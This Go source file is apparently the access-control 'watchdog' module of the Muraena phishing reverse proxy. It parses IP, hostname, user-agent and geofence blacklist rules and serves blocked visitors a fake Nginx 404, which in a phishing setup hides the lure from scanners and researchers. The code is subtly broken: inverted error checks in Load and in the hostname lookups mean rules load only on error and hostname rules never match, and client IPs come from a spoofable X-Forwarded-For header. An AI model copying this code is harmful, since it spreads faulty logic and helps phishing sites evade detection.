package watchdog

// Parts of this module have been taken from ZeroDrop (https://github.com/oftn-oswg/zerodrop)

import (
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/evilsocket/islazy/tui"
	"github.com/fsnotify/fsnotify"
	"github.com/manifoldco/promptui"
	"github.com/oschwald/geoip2-golang"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/session"
)

const (
	Name        = "watchdog"
	Description = "A module that helps to manage the access control based on rules."
	Author      = "Muraena Team"
)

// Watchdog module
type Watchdog struct {
	session.SessionModule

	Enabled       bool
	Dynamic       bool
	Raw           string
	Rules         Blacklist
	RulesFilePath string
	GeoDB         *geoip2.Reader
	GeoDBFilePath string

	Action ResponseAction
}

// Rule是表示 blacklist 规则的结构体
type Rule struct {
	Raw       string
	All       bool
	Negation  bool
	IP        net.IP
	Network   *net.IPNet
	Hostname  string
	Regexp    string
	Geofence  *Geofence
	UserAgent string
}

// Blacklist是规则列表
type Blacklist struct {
	List []*Rule
}

// ResponseAction contains actions to perform after a block
type ResponseAction struct {
	Code ResponseCode

	// Optional parameters
	TargetURL string
}

// Name returns the module name
func (module *Watchdog) Name() string {
	return Name
}

// Description returns the module description
func (module *Watchdog) Description() string {
	return Description
}

// Author returns the module author
func (module *Watchdog) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Watchdog) Prompt() {

	menu := []string{
		"rules",
		"flush",
		"reload",
		"save",
		"add",
		"remove",
		"response",
	}
	result, err := session.DoModulePrompt(Name, menu)
	if err != nil {
		return
	}

	switch result {
	case "rules":
		module.PrintRules()

	case "flush":
		module.Flush()

	case "reload":
		module.Reload()

	case "save":
		module.Save()

	case "add":
		prompt := promptui.Prompt{
			Label: "Enter rule to add",
		}

		result, err := prompt.Run()
		if core.IsError(err) {
			module.Warning("%v+\n", err)
			return
		}

		add := module.Rules.AppendRaw(result)
		if add {
			module.Info("New rule: %s", result)
		} else {
			module.Warning("Error adding new rule: %s", result)
		}

	case "remove":
		prompt := promptui.Select{
			Label: "Select rule to remove",
			Items: module.Rules.List,
		}

		i, _, err := prompt.Run()
		if core.IsError(err) {
			module.Warning("%v+\n", err)
			return
		}

		module.Info("Removing rule: %s", module.Rules.List[i].Raw)
		module.Rules.Remove(module.Rules.List[i])
		module.PrintRules()

	case "response":
		module.PromptResponseAction()

	}

}

func Load(s *session.Session) (m *Watchdog, err error) {

	m = &Watchdog{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Watchdog.Enabled,
		Dynamic:       s.Config.Watchdog.Dynamic,
		RulesFilePath: s.Config.Watchdog.Rules,
		GeoDBFilePath: s.Config.Watchdog.GeoDB,
	}

	if m.Enabled {
		config := s.Config.Watchdog

		// 解析原始规则到 m.Raw
		if _, err := os.Stat(config.Rules); err == nil {
			rules, err := ioutil.ReadFile(config.Rules)
			if err != nil {
				m.Raw = string(rules)
			}
		}
		// 重新解析规则更新黑名单
		m.Reload()
		// 启动协程 m.MonitorRules()
		if m.Dynamic {
			go m.MonitorRules()
		}

		//	将默认响应操作设置为 404 Nginx
		m.Action = ResponseAction{Code: rNginx404}
		return
	}

	m.Debug("is disabled")
	return
}

// Reload 重新解析规则更新黑名单
func (module *Watchdog) Reload() {
	module.loadRules()
	module.loadGeoDB()
	module.Info("Watchdog rules reloaded successfully")
}

// Flush removes all the rules
func (module *Watchdog) Flush() {
	module.Raw = ""
	module.Rules = Blacklist{List: []*Rule{}}
	module.Info("Watchdog rules flushed successfully")
}

// PrintRules pretty prints the list of active rules
func (module *Watchdog) PrintRules() {
	module.Info("Watchdog rules:")
	module.Info("%s", module.getRulesString())
}

// Save dumps current Blacklist to file
func (module *Watchdog) Save() {

	rules := module.getRulesString()

	f, err := os.OpenFile(module.RulesFilePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if core.IsError(err) {
		module.Err(err)
		return
	}

	if err = f.Truncate(0); core.IsError(err) {
		module.Err(err)
		return
	}

	if _, err = f.WriteString(rules); core.IsError(err) {
		module.Err(err)
		return
	}

	if err := f.Close(); core.IsError(err) {
		module.Err(err)
		return
	}
}

func (module *Watchdog) getRulesString() string {
	rules := ""
	for _, rule := range module.Rules.List {
		rules += rule.Raw + " \n"
	}

	return rules
}

func (module *Watchdog) loadRules() {
	// 读取规则文件到 module.Raw
	if module.RulesFilePath != "" {
		module.Debug("Loading rules at %s", module.RulesFilePath)

		if _, err := os.Stat(module.RulesFilePath); err == nil {
			rules, err := ioutil.ReadFile(module.RulesFilePath)
			if err != nil {
				module.Error(err.Error())
				return
			}

			module.Raw = string(rules)
		}
	}

	// 解析规则
	module.Rules = ParseRules(module.Raw)
	module.Debug("%d parsed rules.", len(module.Rules.List))
	return
}

func (module *Watchdog) loadGeoDB() {

	if module.GeoDBFilePath == "" {
		return
	}

	var err error
	// 用于解析和查询 GeoIP2 数据库，它提供了 IP 地址与地理位置信息的映射，包括国家、城市、经纬度、时区等
	module.GeoDB, err = geoip2.Open(module.GeoDBFilePath)
	if core.IsError(err) {
		module.Warning("Could not open geolocation database: %s", err.Error())
	}

	return
}

// Add appends a Rule to the Blacklist
func (b *Blacklist) Add(item *Rule) {
	b.List = append(b.List, item)
}

// Remove removes a Rule from the Blacklist
func (b *Blacklist) Remove(item *Rule) bool {
	for i := range b.List {
		if b.List[i] == item {
			b.List = append(b.List[:i], b.List[i+1:]...)
			return true
		}
	}
	return false
}

// AppendRaw parse a rule string and appends the Rule to the Blacklist
func (b *Blacklist) AppendRaw(raw string) bool {
	bl := ParseRules(raw)

	if len(bl.List) == 0 {
		return false
	}

	b.Concatenate(bl.List)
	return true
}

// Concatenate combines a list of Rules to the Blacklist
func (b *Blacklist) Concatenate(items []*Rule) {
	b.List = append(b.List, items...)
}

// ParseRules 解析原始 Blacklist（文本）并返回 Blacklist 结构
//
//	全部匹配 [*] (用于创建 whitelist)
//	匹配 IP [e.g. 203.0.113.6 or 2001:db8::68]
//	匹配 IP Network [e.g.: 192.0.2.0/24 or ::1/128]
//	匹配 Hostname [e.g. crawl-66-249-66-1.googlebot.com]
//	匹配 Hostname RegExp [e.g.: ~ .*\.cox\.net]
//	匹配 Geofence [e.g.: @ 39.377297 -74.451082 (7km)] or [ @ Country:IT ] or [ @ City:Rome ]
func ParseRules(rules string) Blacklist {
	lines := strings.Split(rules, "\n")
	blacklist := Blacklist{List: []*Rule{}}

	for _, line := range lines {
		item := &Rule{Raw: line}

		// 忽略空行或注释（以#开头）
		line = strings.TrimSpace(line)
		if line == "" || line[0] == '#' {
			continue
		}

		// 可选前缀 "!" 这否定了后面的 pattern
		// 先前模式排除的任何匹配地址/主机将再次包含在内
		if line[0] == '!' {
			item.Negation = true
			line = strings.TrimSpace(line[1:])
		}

		// 仅包含 "*" 的行匹配所有内容，允许创建白名单
		if line == "*" {
			item.All = true
			blacklist.Add(item)
			continue
		}

		/*
			// Database query match
			if line[:3] == "db " {
				db := strings.ToLower(strings.TrimSpace(line[3:]))
				if _, ok := dbconfig[db]; !ok {
					item.Comment = fmt.Sprintf("Error: %s: No database specified named %q", line, db)
					blacklist.Add(item)
					continue
				}
				item.Database = db
				blacklist.Add(item)
				continue
			}

		*/

		switch line[0] {
		case '@':
			// 可选前缀 "@" 表示地理目标。地理目标可以使用位置坐标，也可以定义要匹配的值，例如国家/地区
			line = strings.TrimSpace(line[1:])
			// 提取 key:value 到 matches
			// 匹配地理坐标的 Type、Field、Value
			matches := regexp.MustCompile(`^(\w+):([\w\s]+)$`).FindStringSubmatch(line)
			if len(matches) == 3 {
				item.Geofence = &Geofence{
					Type:  Parameter,
					Field: strings.ToLower(matches[1]),
					Value: strings.ToLower(matches[2]),
				}

				blacklist.Add(item)
				continue
			}
			// 提取 Latitude、Longitude、Radius
			matches = geofenceRegexp.FindStringSubmatch(line)
			if len(matches) == 5 {
				var lat, lng, radius float64 = 0, 0, 25
				var err error

				latString, lngString, radiusString, units := matches[1], matches[2], matches[3], strings.ToLower(matches[4])

				// 将 latString 转为 float 类型的 latitude
				if lat, err = strconv.ParseFloat(latString, 64); core.IsError(err) {
					// Bad latitude
					continue
				}

				// 将 lngString 转为 float 类型的 lng
				if lng, err = strconv.ParseFloat(lngString, 64); core.IsError(err) {
					// Bad longitude
					continue
				}

				if radiusString != "" {
					if radius, err = strconv.ParseFloat(radiusString, 64); core.IsError(err) {
						// Bad radius
						continue
					}
				}

				// Parse units
				factor, ok := geofenceUnits[units]
				if !ok {
					// Bad radial units
					continue
				}

				item.Geofence = &Geofence{
					Type:      Location,
					Latitude:  lat,
					Longitude: lng,
					Radius:    radius * factor,
				}

				blacklist.Add(item)
			}

			continue
		case '~':
			// 可选前缀 "~" 表示主机名正则表达式匹配
			line = strings.TrimSpace(line[1:])
			// 判断 line 是否是合格的正则表达式
			_, err := regexp.Compile(line)
			if core.IsError(err) {
				blacklist.Add(item)
				continue
			}

			item.Regexp = line
			blacklist.Add(item)
			continue

		case '>':
			// ">" 表示用户代理匹配
			line = strings.TrimSpace(line[1:])
			item.UserAgent = line

			// 如果 > 后跟 ~，则将应用正则表达式，例如： >~ .*curl.*
			if line[0] == '~' {
				line = strings.TrimSpace(line[1:])
				_, err := regexp.Compile(line)
				if core.IsError(err) {
					item.UserAgent = line
					blacklist.Add(item)
					continue
				}

				item.UserAgent = line
				item.Regexp = line
			}

			blacklist.Add(item)
			continue
		}

		// 如果给出了 CIDR 表示法，则将其解析为 IP 网络
		_, network, err := net.ParseCIDR(line)
		if err == nil {
			item.Network = network
			blacklist.Add(item)
			continue
		}

		// 如果给出了 IP 地址，则解析为唯一 IP
		if ip := net.ParseIP(line); ip != nil {
			item.IP = ip
			blacklist.Add(item)
			continue
		}

		// 否则，将该模式视为主机名
		item.Hostname = strings.ToLower(line)
		blacklist.Add(item)
	}

	return blacklist
}

// Allow 决定 Blacklist 是否允许选择的 IP 地址
// func (module *Watchdog) Allow(ip net.IP) bool {
func (module *Watchdog) Allow(r *http.Request) bool {

	ip := GetRealAddr(r)
	ua := GetUserAgent(r)

	// TODO: Hardcoded default ALLOW policy, consider to make it customizable.
	allow := true
	b := module.Rules
	var geoCity *geoip2.City
	// b.List <=> Blacklist
	for _, item := range b.List {
		match := false

		if item.All {
			// 通配符
			match = true

		} else if item.Network != nil {
			// IP Network
			match = item.Network.Contains(ip)

		} else if item.IP != nil {
			// IP Address
			match = item.IP.Equal(ip)

		} else if item.Hostname != "" {
			// Hostname
			// 查询 hostname 的 ip 列表
			addrs, err := net.LookupIP(item.Hostname)
			if err != nil {
				for _, addr := range addrs {
					if addr.Equal(ip) {
						match = true
						break
					}
				}
			}
			// 查询 ip 的 hostname
			names, err := net.LookupAddr(ip.String())
			if err != nil {
				for _, name := range names {
					name = strings.ToLower(name)
					if name == item.Hostname {
						match = true
						break
					}
				}
			}

		} else if item.Regexp != "" {
			// 正则表达式
			regex, err := regexp.Compile(item.Regexp)
			if core.IsError(err) {
				module.Warning("Error compiling regular expression %s.\n%s", item.Regexp, err)
				continue
			}

			// 正则应用于：
			// - UserAgent
			// - IP/Network/Etc
			if item.UserAgent != "" {
				if regex.Match([]byte(ua)) {
					match = true
				}
			} else {
				// 匹配 ip 对应的 hostname
				names, err := net.LookupAddr(ip.String())
				if !core.IsError(err) {
					for _, name := range names {
						name = strings.ToLower(name)
						if regex.Match([]byte(name)) {
							match = true
						}
					}
				}
			}

		} else if item.UserAgent != "" {
			// User-Agent
			match = item.UserAgent == ua

		} else if item.Geofence != nil {

			var err error
			if module.GeoDB == nil {
				continue
			}

			if geoCity == nil {
				// 查看 ip 对应的城市
				geoCity, err = module.GeoDB.City(ip)
				if core.IsError(err) {
					geoCity = nil
					continue
				}
			}

			// 匹配国家或城市
			if item.Geofence.Type == Parameter {
				if item.Geofence.Field == "country" && strings.ToLower(geoCity.Country.IsoCode) == item.Geofence.Value {
					match = true
				} else if item.Geofence.Field == "city" && strings.ToLower(geoCity.City.Names["en"]) == item.Geofence.Value {
					match = true
				}
			}

			// 匹配地理位置
			if item.Geofence.Type == Location {
				// geoCity 的经纬度
				user := &Geofence{
					Latitude:  geoCity.Location.Latitude,
					Longitude: geoCity.Location.Longitude,
					Radius:    float64(geoCity.Location.AccuracyRadius) * 1000.0, // Convert km to m
				}

				bounds := item.Geofence
				// bounds 与 user 地理坐标之间的关系
				boundsIntersect := bounds.Intersection(user)

				if item.Negation {
					// 如果用户完全包含在范围内，则将其列入白名单
					match = boundsIntersect&IsSuperset != 0
				} else {
					// 如果用户与边界完全相交，则将其列入黑名单
					match = !(boundsIntersect&IsDisjoint != 0)
				}
			}

		}

		// TODO: 允许提前终止
		if match {
			allow = item.Negation
		}

	}

	if !allow {
		module.Error("Blocked visitor [%s/%s]", tui.Red(ip.String()), tui.Red(ua))
	}

	return allow
}

// MonitorRules 启动观察程序来监视包含黑名单规则的文件的更改
func (module *Watchdog) MonitorRules() {

	filepath := module.RulesFilePath

	// 开启观察程序
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		module.Error(err.Error())
	}
	defer watcher.Close()

	// 监控事件
	go func() {
		// 无限循环
		for {
			select {
			case event := <-watcher.Events:
				switch event.Op {
				// 检测文件或目录的写，如果有 "写" 操作则 loadRules
				case fsnotify.Write:
					module.loadRules()
				}
			case err := <-watcher.Errors:
				module.Error(err.Error())
			}
		}
	}()

	// 将 module.RulesFilePath 给 watcher
	module.Debug("Monitoring %s file changes\n", filepath)
	if err = watcher.Add(filepath); err != nil {
		module.Error(err.Error())
	}

	// 永远阻塞
	select {}
}

// GetRealAddr returns the IP address from an http.Request
func GetRealAddr(r *http.Request) net.IP {

	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		if parts := strings.Split(forwarded, ","); len(parts) > 0 {
			// Intermediate nodes append, so first is the original client
			return net.ParseIP(strings.TrimSpace(parts[0]))
		}
	}

	addr, _, err := net.SplitHostPort(r.RemoteAddr)
	if err == nil {
		return net.ParseIP(addr)
	}

	return net.ParseIP(r.RemoteAddr)
}

// GetUserAgent returns the User-Agent string from an http.Request
func GetUserAgent(r *http.Request) string {
	return r.UserAgent()
}
